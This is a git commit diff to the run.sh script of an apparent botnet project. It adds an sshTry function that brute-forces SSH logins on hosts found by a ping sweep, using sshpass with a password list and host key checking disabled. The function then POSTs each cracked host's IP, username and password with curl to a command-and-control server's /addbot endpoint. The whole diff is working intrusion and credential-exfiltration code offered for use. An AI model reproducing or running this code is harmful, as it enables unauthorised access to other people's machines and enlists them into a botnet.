0d1e76f0d1da9cad1d1529706042d745d25c5832
KSTARK007 <kiranhombal98@gmail.com>
2020-03-30 12:07:42 +0530

    sshTry included in run.sh

--- botnet/run.sh
+++ botnet/run.sh
@@ -24,20 +24,64 @@ else
 	echo "trying with $ip.0/24"
 fi
 
+# Scan network helper
 is_alive_ping()
 {
   ping -c 1 $1 > /dev/null
   [ $? -eq 0 ] && echo $i
 }
 
-
+# scan network main 
 nwscan()
 {
-for i in $1{2..254}
-do
-is_alive_ping $i & disown
-done
+	for i in $1{2..254}
+	do
+	is_alive_ping $i & disown
+	done
 }
+
+
+# brute force try to ssh into the machine
+sshTry()
+{
+	INPUT=password.csv
+	OUTPUTFILE=userPassIPFile.txt
+	OLDIFS=$IFS
+	IFS=','
+	uname=""
+	pass=""
+	cnc=192.168.1.18:5000
+
+	[ ! -f $INPUT ] && { echo "$INPUT file not found"; exit 99; }
+	while read username password
+	do
+		trap 'echo ""; echo"" ;echo "Skipped by the user"; echo"";echo "exiting this $1";exit 0' INT
+		uname=$username
+		pass=$password
+		echo "trying $username and $password."
+		sshpass -p "$password" ssh -oStrictHostKeyChecking=no $username@$1 &>/dev/null
+		if [ $? -eq 0 ]
+		then
+			echo "Username : $username"
+			echo "Password : $password"
+			break
+		fi
+	done < $INPUT
+	IFS=$OLDIFS
+	val=$1,$uname,$pass
+	if [[ $uname == "NA" ]]
+	then
+		echo ""
+		echo "user name and password not found for $1"
+		echo ""
+		exit 0
+	fi
+	curl --header "Content-Type: application/json" --request POST --data "{\"ip\":\"$1\",\"username\":\"$uname\",\"password\":\"$pass\"}" http://$cnc/addbot
+	echo "$val" >>$OUTPUTFILE
+	echo "$val added"
+}
+
+
 
 n=1
 k=1
@@ -63,7 +107,7 @@ echo ""
 
 while IFS= read -r line; do
 	echo "Brute forcing the device with IP $line"
-	./sshTry.sh $line
+	sshTry $line
 	echo ""
 	echo ""
 done < ips.txt
